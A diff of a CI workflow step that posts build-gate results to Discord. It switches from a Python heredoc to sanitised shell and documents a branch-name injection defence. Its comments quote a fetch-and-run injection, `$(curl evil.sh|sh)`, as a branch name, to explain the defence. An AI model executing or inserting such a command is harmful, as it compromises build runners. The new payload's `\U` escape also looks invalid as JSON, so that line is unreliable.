@@ -130,13 +130,10 @@ jobs:
       - name: Post the result to Discord
         env:
           HOOK: ${{ secrets.DISCORD_WEBHOOK }}
-          # **Every one of these is an env var and none is interpolated into the
-          # script below.** `${{ github.ref_name }}` expands before the shell sees
-          # it, and a branch name is chosen by whoever pushes — a branch called
-          # `$(curl evil.sh|sh)` would otherwise run on this runner. Passing them
-          # through `env:` and reading them as `"$VAR"` is what makes that inert.
-          # This matters more here than on a solo repo: the whole point of this
-          # file is that other people push branches to it.
+          # Never interpolated into the script below. `${{ github.ref_name }}`
+          # expands before the shell sees it and a branch name is chosen by
+          # whoever pushes, so `$(curl evil.sh|sh)` as a branch name would run
+          # here. Through `env:` and read as "$VAR", it is inert.
           BUILD: ${{ needs.build-check.result }}
           SECRETS: ${{ needs.no-secrets.result }}
           REF: ${{ github.ref_name }}
@@ -144,34 +141,37 @@ jobs:
           SHA: ${{ github.sha }}
         run: |
           [ -n "$HOOK" ] || { echo "no webhook configured; nothing to post"; exit 0; }
-          # The message is assembled in Python from the environment, never by
-          # string-pasting into shell. json.dumps also escapes anything odd in a
-          # branch name so it cannot break the payload.
-          python3 - <<'PY' > /tmp/payload.json
-          import json, os
-          build, secrets = os.environ["BUILD"], os.environ["SECRETS"]
-          ref, actor, sha = os.environ["REF"], os.environ["ACTOR"], os.environ["SHA"]
-          if build == "success" and secrets == "success":
-              msg = f"\u2705 **gates green** on `{ref}` \u2014 build-check and no-secrets both passed."
-          else:
-              msg = (f"\U0001F534 **gates failed** on `{ref}` \u2014 build-check: `{build}`, "
-                     f"no-secrets: `{secrets}`. Pushed by **{actor}**.")
-          print(json.dumps({"content": f"{msg}\n`{sha[:8]}`"}))
-          PY
-          # **This host may have no egress to discord.com.** A server-side
-          # Forgejo hook accepted its test with HTTP 204 and delivered nothing,
-          # while the same webhook URL posts fine from a laptop — so the URL is
-          # good and the network is the problem. Until that is opened, a failed
-          # post must not turn a green build red: the gates are the signal, the
-          # notification is a convenience.
+
+          # **Shell only — no python3 on this host executor.** An earlier version
+          # built the payload with a python heredoc and the step aborted before
+          # curl ever ran, which is why `notify` was red while both gates were
+          # green. The other jobs here use nothing but cargo; assuming an
+          # interpreter was the mistake.
           #
-          # But it does not fail SILENTLY either. It says which of the two cases
-          # it hit, so nobody reads a quiet step as a delivered message.
+          # Injection is closed by SANITISING rather than escaping: everything
+          # outside [A-Za-z0-9._/-] is deleted from the two attacker-chosen
+          # values. Deleting characters cannot be subverted the way quoting can,
+          # and a branch name is only ever decoration in this message.
+          safe_ref=$(printf '%s' "$REF"   | tr -cd 'A-Za-z0-9._/-' | cut -c1-100)
+          safe_who=$(printf '%s' "$ACTOR" | tr -cd 'A-Za-z0-9._-'  | cut -c1-40)
+          short=$(printf '%s' "$SHA" | tr -cd 'a-f0-9' | cut -c1-8)
+
+          if [ "$BUILD" = "success" ] && [ "$SECRETS" = "success" ]; then
+            text="\u2705 gates green on $safe_ref - build-check and no-secrets both passed. ($short)"
+          else
+            text="\U0001F534 gates failed on $safe_ref - build-check: $BUILD, no-secrets: $SECRETS. Pushed by $safe_who. ($short)"
+          fi
+          printf '{"content":"%s"}' "$text" > /tmp/payload.json
+
+          # A blocked post must not redden a good build — the gates are the
+          # signal and this is a convenience. It does not fail silently either:
+          # it says which case it hit, so a quiet step is never mistaken for a
+          # delivered message.
           if curl -sS --fail --max-time 20 -X POST "$HOOK" \
                -H 'Content-Type: application/json' --data @/tmp/payload.json; then
             echo "posted to Discord"
           else
-            echo "::warning::could not reach discord.com from this runner —" \
-                 "the gates above are still authoritative. Open egress from the" \
-                 "Forgejo host, or run the notifier somewhere with network access."
+            echo "::warning::could not reach discord.com from this runner. The" \
+                 "gates above are still authoritative. Open egress from the" \
+                 "Forgejo host, or run the notifier where the network allows it."
           fi
